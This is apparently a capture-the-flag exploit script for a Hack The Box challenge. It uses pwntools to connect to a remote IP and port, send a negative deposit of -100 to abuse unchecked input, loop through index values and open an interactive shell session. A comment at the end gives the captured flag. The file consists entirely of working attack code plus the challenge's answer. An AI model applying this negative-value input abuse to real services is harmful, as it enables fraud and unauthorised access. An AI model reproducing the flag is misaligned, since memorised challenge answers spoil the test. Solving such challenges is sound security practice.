from hashlib import *
import string
from pwn import *

r = remote('178.62.18.46', 30337)

r.recvuntil(b'Exit.\n')
r.sendline(b"2")

r.recvuntil(b'deposit?\n')
r.sendline(b"-100")

print("hgoe")

for i in reversed(range(40)):
    r.recvuntil('Exit.\n')
    r.sendline(b"1")

    r.recvuntil(':')
    r.sendline(str(i))

    print(i)

r.recvuntil(b'Exit.\n')
r.sendline(b"3")

r.interactive()

# HTB{u_ov3rwr0t3_th3_s3cr3t_p455phr4s3}
